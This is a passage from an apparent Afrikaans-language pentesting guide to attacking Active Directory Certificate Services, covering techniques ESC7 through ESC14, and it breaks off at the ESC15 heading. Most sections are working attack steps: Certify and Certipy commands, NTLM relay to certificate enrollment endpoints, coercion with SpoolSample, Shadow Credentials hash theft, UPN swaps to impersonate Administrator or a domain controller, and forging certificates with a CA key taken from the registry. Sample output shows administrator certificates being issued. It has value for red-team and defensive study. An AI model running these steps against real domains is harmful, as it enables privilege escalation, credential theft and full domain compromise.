Die `ICertAdmin::SetExtension` RPC-metode kan deur enige prinsipal uitgevoer word wat *Manage Certificates* het. Hoewel die metode tradisioneel deur wettige CA’s gebruik is om uitbreidings op **hangende** versoeke by te werk, kan ’n aanvaller dit misbruik om ’n *nie-verstek*-sertifikaatuitbreiding (byvoorbeeld ’n pasgemaakte *Certificate Issuance Policy*-OID soos `1.1.1.1`) by ’n versoek te voeg wat op goedkeuring wag.

Omdat die geteikende template **nie ’n verstekwaarde vir daardie uitbreiding definieer nie**, sal die CA NIE die aanvaller-beheerde waarde oorskryf wanneer die versoek uiteindelik uitgereik word nie. Die gevolglike sertifikaat bevat dus ’n uitbreiding wat deur die aanvaller gekies is en wat moontlik:

* Aan die Application / Issuance Policy-vereistes van ander kwesbare templates voldoen (wat tot voorregte-eskalasie lei).
* Bykomende EKU’s of beleide invoeg wat die sertifikaat onverwagte vertroue in derdepartystelsels verleen.

Kortom, *Manage Certificates* – wat voorheen as die “minder kragtige” helfte van ESC7 beskou is – kan nou vir volle voorregte-eskalasie of langtermynvolharding gebruik word, sonder om die CA-konfigurasie te verander of die meer beperkende *Manage CA*-reg te vereis.

#### Misbruik van die primitief met Certify 2.0

1. **Dien ’n sertifikaatversoek in wat *hangend* sal bly.** Dit kan afgedwing word met ’n template wat bestuurdergoedkeuring vereis:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Voeg 'n pasgemaakte uitbreiding by die hangende versoek** met die nuwe `manage-ca`-opdrag:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Indien die sjabloon nie reeds die *Certificate Issuance Policies*-uitbreiding definieer nie, sal die waarde hierbo ná uitreiking behoue bly.*

3. **Dien die versoek in** (indien jou rol ook *Manage Certificates*-goedkeuringsregte het), of wag totdat ’n operateur dit goedkeur. Sodra dit uitgereik is, laai die sertifikaat af:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Die resulterende sertifikaat bevat nou die kwaadwillige issuance-policy OID en kan in daaropvolgende aanvalle gebruik word (bv. ESC13, domain escalation, ens.).

> LET WEL: Dieselfde aanval kan met Certipy ≥ 4.7 uitgevoer word deur die `ca`-opdrag en die `-set-extension`-parameter te gebruik.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Verduideliking

> [!TIP]
> In omgewings waar **AD CS geïnstalleer is**, as ’n **kwesbare web enrollment-eindpunt bestaan** en minstens een **sertifikaatsjabloon gepubliseer is** wat **domeinrekenaar-inskrywing en kliëntverifikasie** toelaat (soos die verstek **`Machine`**-sjabloon), kan **enige rekenaar met die spooler-diens aktief deur ’n aanvaller gekompromitteer word**!

AD CS ondersteun verskeie **HTTP-gebaseerde inskrywingsmetodes**, wat beskikbaar gestel word deur bykomende bedienerrolle wat administrateurs kan installeer. Hierdie koppelvlakke vir HTTP-gebaseerde sertifikaat-inskrywing is kwesbaar vir **NTLM relay-aanvalle**. ’n Aanvaller kan vanaf ’n **gekompromitteerde masjien enige AD-rekening naboots wat via inkomende NTLM verifieer**. Terwyl die aanvaller die slagofferrekening naboots, kan hy hierdie webkoppelvlakke gebruik om **’n kliëntverifikasiesertifikaat aan te vra deur die `User`- of `Machine`-sertifikaatsjablone te gebruik**.

- Die **web enrollment-koppelvlak** (’n ouer ASP-toepassing beskikbaar by `http://<caserver>/certsrv/`) gebruik by verstek net HTTP, wat geen beskerming teen NTLM relay-aanvalle bied nie. Daarbenewens laat dit uitdruklik slegs NTLM-verifikasie deur sy Authorization HTTP-kopskrif toe, wat veiliger verifikasiemetodes soos Kerberos onbruikbaar maak.
- Die **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service en **Network Device Enrollment Service** (NDES) ondersteun by verstek negotiate-verifikasie via hul Authorization HTTP-kopskrif. Negotiate-verifikasie **ondersteun beide** Kerberos en **NTLM**, sodat ’n aanvaller tydens relay-aanvalle na NTLM-verifikasie kan **afgradeer**. Hoewel hierdie webdienste HTTPS by verstek aktiveer, **beskerm HTTPS alleen nie teen NTLM relay-aanvalle nie**. Beskerming teen NTLM relay-aanvalle vir HTTPS-dienste is slegs moontlik wanneer HTTPS met channel binding gekombineer word. Ongelukkig aktiveer AD CS nie Extended Protection for Authentication op IIS nie, wat vir channel binding vereis word.<sup>[[6]](#references)</sup>

’n Algemene **probleem** met NTLM relay-aanvalle is die **kort duur van NTLM-sessies** en die onvermoë van die aanvaller om met dienste te kommunikeer wat **NTLM-ondertekening vereis**.

Hierdie beperking kan egter oorkom word deur ’n NTLM relay-aanval uit te buit om ’n sertifikaat vir die gebruiker te verkry, aangesien die geldigheidstydperk van die sertifikaat die duur van die sessie bepaal, en die sertifikaat gebruik kan word met dienste wat **NTLM-ondertekening vereis**. Vir instruksies oor die gebruik van ’n gesteelde sertifikaat, verwys na:


{{#ref}}
account-persistence.md
{{#endref}}

Nog ’n beperking van NTLM relay-aanvalle is dat **’n slagofferrekening by ’n masjien moet verifieer wat deur die aanvaller beheer word**. Die aanvaller kan óf wag óf probeer om hierdie verifikasie **af te dwing**:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Misbruik**

[**Certify**](https://github.com/GhostPack/Certify) se `cas` lys **geaktiveerde HTTP AD CS-eindpunte** op:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die `msPKI-Enrollment-Servers`-eienskap word deur ondernemings-sertifikaatowerhede (CA's) gebruik om Certificate Enrollment Service (CES)-eindpunte te stoor. Hierdie eindpunte kan ontleed en gelys word deur die nutsmiddel **Certutil.exe** te gebruik:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Misbruik met Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Misbruik met [Certipy](https://github.com/ly4k/Certipy)

Certipy maak by verstek ’n sertifikaataanvraag op grond van die `Machine`- of `User`-template, afhangend daarvan of die rekeningnaam wat oorgedra word op `$` eindig. ’n Alternatiewe template kan gespesifiseer word deur die `-template`-parameter te gebruik.

’n Tegniek soos [PetitPotam](https://github.com/ly4k/PetitPotam) kan dan gebruik word om verifikasie af te dwing. Wanneer daar met domeinbeheerders gewerk word, moet `-template DomainController` gespesifiseer word.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Verduideliking

Die **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`)-waarde vir **`msPKI-Enrollment-Flag`**, waarna as ESC9 verwys word, laat die `szOID_NTDS_CA_SECURITY_EXT` SID-uitbreiding uit ’n sertifikaat weg. Ouer ESC9-voorbeelde maak staat op KDC-versoenbaarheidsgedrag (`StrongCertificateBindingEnforcement=1`) of ’n afsonderlike swak Schannel-karteringsroete. Waarde `1` is ’n **historiese versoenbaarheidsinstelling**, nie ’n huidige verstekwaarde nie: Microsoft sê dat die KDC-oorskrywing nie meer ondersteun word sedert die Windows-sekuriteitsopdatering van 9 September 2025 nie. Gaan die teiken se werklike opdatering en verifikasie-eindpunt na voordat jy ’n ouer resep toepas.<sup>[[7]](#references)</sup> Sien [Microsoft se ontplooiingsriglyne](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Die omstandighede waaronder die instelling van hierdie vlag belangrik word, sluit die volgende in:

- Op ’n ouer, versoenbare KDC laat die effektiewe sertifikaatbindingbeleid die kartering toe; alternatiewelik aktiveer die Schannel-eindpunt afsonderlik UPN-kartering via `CertificateMappingMethods`-bit `0x4`.
- Die sertifikaat is gemerk met die `CT_FLAG_NO_SECURITY_EXTENSION`-vlag binne die `msPKI-Enrollment-Flag`-instelling.
- Enige kliëntverifikasie-EKU word deur die sertifikaat gespesifiseer.
- `GenericWrite`-toestemmings is beskikbaar oor enige rekening om ’n ander rekening te kompromitteer.

### Misbruikscenario

Gestel `John@corp.local` het `GenericWrite`-toestemmings oor `Jane@corp.local`, met die doel om `Administrator@corp.local` te kompromitteer. Die `ESC9`-sertifikaatsjabloon, waarvoor `Jane@corp.local` mag inskryf, is met die `CT_FLAG_NO_SECURITY_EXTENSION`-vlag in sy `msPKI-Enrollment-Flag`-instelling opgestel.

Aanvanklik word `Jane` se hash verkry deur Shadow Credentials te gebruik, danksy `John` se `GenericWrite`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Vervolgens word `Jane` se `userPrincipalName` na `Administrator` verander, met opset sonder die `@corp.local`-domeindeel:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Hierdie wysiging oortree nie beperkings nie, aangesien `Administrator@corp.local` steeds verskil van `Administrator` se `userPrincipalName`.

Hierna word die `ESC9`-sertifikaatsjabloon, wat as kwesbaar gemerk is, as `Jane` aangevra:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Daar word opgemerk dat die sertifikaat se `userPrincipalName` `Administrator` weerspieël, sonder enige “object SID”.

`Jane` se `userPrincipalName` word dan na haar oorspronklike waarde teruggestel: `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

As daar nou met die uitgereikte sertifikaat geauthentiseer word, lewer dit die NT-hash van `Administrator@corp.local`. Die opdrag moet `-domain <domain>` insluit omdat die sertifikaat nie ’n domein spesifiseer nie:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Swak sertifikaatkarterings - ESC10

### Verduideliking

Twee afsonderlike sertifikaatkarteringsbeleide word dikwels onder ESC10 bespreek. Lees die instelling op die eindpunt wat die betrokke verifikasie werklik hanteer:

- Schannel `CertificateMappingMethods` onder `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` beheer TLS-kliëntsertifikaatkartering op die toepassingbediener. Die UPN-bis is `0x4`; die verstekwaarde op opgedateerde stelsels is `0x18` (`0x8 | 0x10`).
- KDC `StrongCertificateBindingEnforcement` onder `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` het histories Kerberos-sertifikaatbindingversoenbaarheid beheer. Waarde `1` is nie ’n betroubare huidige verstekwaarde nie, en Microsoft het ondersteuning vir hierdie oorheersing beëindig met die Windows-sekuriteitsopdatering van 9 September 2025. Die toestand daarvan beskryf nie op sigself Schannel se UPN-kartering nie.<sup>[[7]](#references)</sup>

**Geval 1**

Histories, wanneer ’n ouer KDC `StrongCertificateBindingEnforcement=0` aanvaar het; verifieer die opdateringsvlak, aangesien die oorheersing nie meer op huidige, volledig gelapte stelsels ondersteun word nie.

**Geval 2**

Wanneer die Schannel-kliëntsertifikaat-eindpunt se `CertificateMappingMethods` UPN-bis (`0x4`) geaktiveer is. Dit is ’n afsonderlike instelling van KDC se sterkbindingsafdwinging en vereis steeds ’n sertifikaat vir kliëntverifikasie waarvoor ingeskryf kan word, plus effektiewe beheer oor die gekarteerde rekeningkenmerk.

### Misbruikgeval 1

In ’n ouer ontplooiing waar die KDC steeds `StrongCertificateBindingEnforcement=0` aanvaar, kan beheer oor ’n rekening se `userPrincipalName` deel vorm van ’n swak-karteringspad na ’n ander rekening. Die vereiste sertifikaatinskrywing, kartering, teikenidentiteit en suksesvolle verifikasie moet afsonderlik nagegaan word; ’n `GenericWrite` ACE of registerwaarde alleen bewys nie dat die rekening oorgeneem kan word nie.

Byvoorbeeld, as ’n aanvaller `GenericWrite`-toestemmings oor `Jane@corp.local` het, probeer die aanvaller `Administrator@corp.local` kompromitteer. Die prosedure stem ooreen met ESC9, wat die gebruik van enige sertifikaatsjabloon moontlik maak.

Eers word Jane se hash met Shadow Credentials verkry deur die `GenericWrite`-toestemming te misbruik.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Vervolgens word `Jane` se `userPrincipalName` verander na `Administrator`, terwyl die @corp.local-gedeelte doelbewus weggelaat word om ’n beperkingskending te vermy.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Hierna word 'n sertifikaat wat kliëntverifikasie moontlik maak as `Jane` aangevra, met die verstek-`User`-sjabloon.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane` se `userPrincipalName` word dan na sy oorspronklike waarde teruggestel, Jane@corp.local.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Deur met die verkrygde sertifikaat te staaf, sal die NT-hash van `Administrator@corp.local` verkry word. Dit vereis dat die domein in die opdrag gespesifiseer word, aangesien die sertifikaat nie domeinbesonderhede bevat nie.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Misbruikgeval 2

Met `CertificateMappingMethods` wat die `UPN`-bitvlag (`0x4`) bevat, kan ’n rekening A met `GenericWrite`-regte enige rekening B kompromitteer wat nie ’n `userPrincipalName`-eienskap het nie, insluitend masjienrekeninge en die ingeboude domeinadministrateur `Administrator`.

Die doel hier is om `DC$@corp.local` te kompromitteer, deur eers Jane se hash met Shadow Credentials te bekom en die `GenericWrite`-regte te benut.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`Jane` se `userPrincipalName` word dan op `DC$@corp.local` gestel.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

’n Sertifikaat vir kliëntverifikasie word as `Jane` aangevra met die verstek-`User`-sjabloon.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane` se `userPrincipalName` word ná hierdie proses na sy oorspronklike waarde teruggestel.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Om via Schannel te staaf, word Certipy se `-ldap-shell`-opsie gebruik, wat op suksesvolle stawing dui as `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Deur die LDAP-shell maak opdragte soos `set_rbcd` Resource-Based Constrained Delegation (RBCD)-aanvalle moontlik, wat die domeinbeheerder moontlik kan kompromitteer.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Hierdie kwesbaarheid strek ook tot enige gebruikersrekening sonder `userPrincipalName`, of waar dit nie met `sAMAccountName` ooreenstem nie. Die verstekrekening `Administrator@corp.local` is ’n uitsoekte teiken weens sy verhoogde LDAP-regte en die feit dat dit by verstek nie ’n `userPrincipalName` het nie.

## Relaying NTLM to ICPR - ESC11

### Verduideliking

As die CA Server nie met `IF_ENFORCEENCRYPTICERTREQUEST` gekonfigureer is nie, kan NTLM relay-aanvalle sonder signing via die RPC-diens uitgevoer word. [Verwysing hier](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Jy kan `certipy` gebruik om vas te stel of `Enforce Encryption for Requests` gedeaktiveer is. Certipy sal dan `ESC11`-kwesbaarhede wys.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Misbruikscenario

Dit is nodig om 'n relay server op te stel:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Let wel: Vir domeinbeheerders moet ons `-template` in DomainController spesifiseer.

Of deur [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) te gebruik:

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access to ADCS CA with YubiHSM - ESC12

### Verduideliking

Administrateurs kan die Certificate Authority so opstel dat dit op ’n eksterne toestel soos die "Yubico YubiHSM2" gestoor word.

As ’n USB-toestel via ’n USB-poort aan die CA-bediener gekoppel is, of aan ’n USB-toestelbediener indien die CA-bediener ’n virtuele masjien is, word ’n verifikasiesleutel (soms ’n "password" genoem) vereis sodat die Key Storage Provider sleutels in die YubiHSM kan genereer en gebruik.

Hierdie sleutel/password word in cleartext in die register gestoor onder `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Verwysing [hier](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Misbruikscenario

As die CA se private sleutel op ’n fisiese USB-toestel gestoor word wanneer jy shell access kry, is dit moontlik om die sleutel te herwin.

Eerstens moet jy die CA-sertifikaat verkry (dit is publiek), en dan:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Gebruik laastens die certutil `-sign`-opdrag om ’n nuwe arbitrêre sertifikaat met die CA-sertifikaat en sy private sleutel te vervals.

## OID Group Link Abuse - ESC13

### Verduideliking

Die `msPKI-Certificate-Policy`-kenmerk laat toe dat die uitreikingsbeleid by die sertifikaatsjabloon gevoeg word. Die `msPKI-Enterprise-Oid`-objekte wat verantwoordelik is vir die uitreiking van beleide, kan in die Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) van die PKI OID-houer opgespoor word. ’n Beleid kan met ’n AD-groep gekoppel word deur hierdie objek se `msDS-OIDToGroupLink`-kenmerk, wat ’n stelsel in staat stel om ’n gebruiker wat die sertifikaat aanbied, te magtig asof hy ’n lid van die groep is. [Verwysing hier](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Met ander woorde, wanneer ’n gebruiker toestemming het om vir ’n sertifikaat in te skryf en die sertifikaat aan ’n OID-groep gekoppel is, kan die gebruiker die groep se voorregte erf.

Gebruik [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) om OIDToGroupLink te vind:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Misbruikscenario

Vind ’n gebruikerstoestemming wat dit kan gebruik met `certipy find` of `Certify.exe find /showAllPermissions`.

As `John` toestemming het om by `VulnerableTemplate` in te skryf, kan die gebruiker die voorregte van die `VulnerableGroup`-groep erf.

Al wat dit hoef te doen, is om die template te spesifiseer; dit sal ’n sertifikaat met OIDToGroupLink-regte kry.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Misbruik van eksplisiete sertifikaatkartering — ESC14

### Verduideliking

Die beskrywing by https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is besonder deeglik. Hieronder volg ’n aanhaling uit die oorspronklike teks.<sup>[[14]](#references)</sup>

ESC14 handel oor kwesbaarhede wat voortspruit uit “swak eksplisiete sertifikaatkartering”, hoofsaaklik deur die misbruik of onveilige konfigurasie van die `altSecurityIdentities`-kenmerk op Active Directory-gebruiker- of rekenaarrekeninge. Hierdie multivalued-kenmerk stel administrateurs in staat om X.509-sertifikate handmatig vir verifikasiedoeleindes aan ’n AD-rekening te koppel. Wanneer hierdie eksplisiete karterings ingevul is, kan hulle die versteksertifikaatkarteringslogika oorheers, wat gewoonlik op UPN’s of DNS-name in die sertifikaat se SAN, of die SID wat in die `szOID_NTDS_CA_SECURITY_EXT`-sekuriteitsuitbreiding ingebed is, staatmaak.

’n “Swak” kartering kom voor wanneer die stringwaarde wat in die `altSecurityIdentities`-kenmerk gebruik word om ’n sertifikaat te identifiseer, te wyd is, maklik geraai kan word, op nie-unieke sertifikaatvelde staatmaak of maklik vervalsbare sertifikaatkomponente gebruik. As ’n aanvaller ’n sertifikaat kan bekom of skep waarvan die kenmerke ooreenstem met so ’n swak gedefinieerde eksplisiete kartering vir ’n bevoorregte rekening, kan hulle daardie sertifikaat gebruik om as daardie rekening te verifieer en dit na te boots.

Voorbeelde van moontlik swak `altSecurityIdentities`-karteringstringe sluit in:

- Kartering wat uitsluitlik op ’n algemene Subject Common Name (CN) berus: bv. `X509:<S>CN=SomeUser`. ’n Aanvaller kan moontlik ’n sertifikaat met hierdie CN by ’n minder veilige bron bekom.
- Die gebruik van té algemene Issuer Distinguished Names (DN’s) of Subject DN’s sonder verdere kwalifikasie, soos ’n spesifieke reeksnommer of onderwerp-sleutelidentifiseerder: bv. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Die gebruik van ander voorspelbare patrone of nie-kriptografiese identifiseerders waaraan ’n aanvaller kan voldoen in ’n sertifikaat wat hulle wettiglik kan bekom of vervals (as hulle ’n CA gekompromitteer het of ’n kwesbare sjabloon soos in ESC1 gevind het).

Die `altSecurityIdentities`-kenmerk ondersteun verskeie formate vir kartering, soos:

- `X509:<I>IssuerDN<S>SubjectDN` (karteer volgens die volledige Issuer- en Subject-DN)
- `X509:<SKI>SubjectKeyIdentifier` (karteer volgens die waarde van die sertifikaat se Subject Key Identifier-uitbreiding)
- `X509:<SR>SerialNumberBackedByIssuerDN` (karteer volgens reeksnommer, implisiet gekwalifiseer deur die Issuer-DN) - dit is nie ’n standaardformaat nie; gewoonlik is dit `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (karteer volgens ’n RFC822-naam, gewoonlik ’n e-posadres, vanaf die SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (karteer volgens ’n SHA1-hash van die sertifikaat se rou publieke sleutel - oor die algemeen sterk)

Die sekuriteit van hierdie karterings hang af van die identifiseerders in die kartering. Microsoft klassifiseer karterings op grond van e-pos- of onderwerppname, insluitend `X509:<RFC822>`, as **swak**. In Full Enforcement-modus word ’n sertifikaat sonder ’n sterk kartering afgekeur; die Windows-sekuriteitsopdatering van September 2025 het die opsie om na Compatibility-modus terug te keer, verwyder. ’n Swak kartering alleen is dus nie ’n betroubare huidige pad vir nabootsing nie. Gaan die domeinbeheerder se werklike pleistervlak en sertifikaatkarteringsgedrag na voordat jy ’n scenario met swak kartering beoordeel. Skryftoegang tot `altSecurityIdentities` is ’n afsonderlike aanknopingspunt: ’n aanvaller met ’n toepaslike vertroude sertifikaat kan moontlik ’n **sterk** eksplisiete kartering byvoeg, onderhewig aan effektiewe toestemmings en sertifikaatvalidering. Sien [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) en [die ESC14-navorsing](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Foute met sertifikaatverifikasie moet ook gediagnoseer word: ’n gedeaktiveerde teikenrekening of ’n wagwoord wat verval het, kan aanmelding voorkom selfs wanneer die sertifikaat self steeds geldig is.

### Misbruikscenario

ESC14 teiken **eksplisiete sertifikaatkarterings** in Active Directory (AD), spesifiek die `altSecurityIdentities`-kenmerk. As hierdie kenmerk ingestel is (deur ontwerp of weens verkeerde konfigurasie), kan aanvallers rekeninge naboots deur sertifikate aan te bied wat by die kartering pas.

#### Scenario A: Aanvaller kan na `altSecurityIdentities` skryf

 **Voorvereiste**: Die aanvaller het skryftoestemmings vir die teikenrekening se `altSecurityIdentities`-kenmerk, of die toestemming om dit toe te ken in die vorm van een van die volgende toestemmings op die teiken-AD-objek:  
- Skryfkenmerk `altSecurityIdentities`  
- Skryfkenmerk `Public-Information`  
- Skryfkenmerk (alle)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Eienaar*.
#### Scenario B: Teiken het swak kartering via X509RFC822 (e-pos)

- **Historiese/voorwaardelike voorvereiste**: Die teiken het ’n swak X509RFC822-kartering in `altSecurityIdentities`, die aanvaller kan ’n inskrywer se `mail`-kenmerk wysig, en ’n geskikte sjabloon sluit daardie e-posadres in ’n kliëntverifikasiesertifikaat in sonder ’n botsende SID-binding. Verifikasie vereis ook ’n omgewing wat steeds die swak kartering aanvaar; Full Enforcement verwerp sertifikaatkarterings wat slegs swak is. ’n Skryfbare `mail`-kenmerk alleen is bloot ’n aanknopingspunt.
#### Scenario C: Teiken het X509IssuerSubject-kartering

- **Voorvereiste**: Die teiken het ’n swak eksplisiete X509IssuerSubject-kartering in `altSecurityIdentities`. Die aanvaller kan die `cn`- of `dNSHostName`-kenmerk op ’n slagofferprinsipaal instel sodat dit ooreenstem met die onderwerp van die teiken se X509IssuerSubject-kartering. Daarna kan die aanvaller ’n sertifikaat as die slagoffer inskryf en hierdie sertifikaat gebruik om as die teiken te verifieer.
#### Scenario D: Teiken het X509SubjectOnly-kartering

- **Voorvereiste**: Die teiken het ’n swak eksplisiete X509SubjectOnly-kartering in `altSecurityIdentities`. Die aanvaller kan die `cn`- of `dNSHostName`-kenmerk op ’n slagofferprinsipaal instel sodat dit ooreenstem met die onderwerp van die teiken se X509SubjectOnly-kartering. Daarna kan die aanvaller ’n sertifikaat as die slagoffer inskryf en hierdie sertifikaat gebruik om as die teiken te verifieer.
### konkrete bewerkings
#### Scenario A

Versoek ’n sertifikaat van die sertifikaatsjabloon `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Stoor en skakel die sertifikaat om

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Verifieer (met behulp van die sertifikaat)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Opruiming (opsioneel)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Vir meer spesifieke aanvalmetodes in verskeie aanvalscenario's, verwys asseblief na die volgende: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Verduideliking

